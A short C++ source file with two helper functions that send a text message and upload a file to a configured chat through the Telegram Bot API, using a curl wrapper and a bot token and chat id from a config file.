#include "pch.h"
#include "telegram.h"
#include "curl.h"
#include "../config/telegram.h"
#include "../utils.h"

#include <iostream>

namespace telegram {
	TelegramConfig cfg;
	
	void SendMessageT(std::string msg, std::string parsemode) {
		std::string data = "chat_id=" + utils::urlEncode(cfg.chatid) + "&text=" + utils::urlEncode(utils::escText(msg)) + "&parse_mode=" + utils::urlEncode(parsemode);

		curl::Post("https://api.telegram.org/bot" + cfg.bottoken + "/sendMessage", data);
	}

	void SendDocument(std::string path) {
		std::string url = "https://api.telegram.org/bot" + cfg.bottoken + "/sendDocument?chat_id=" + cfg.chatid;

		curl::PostDocument(url, path);
	}
}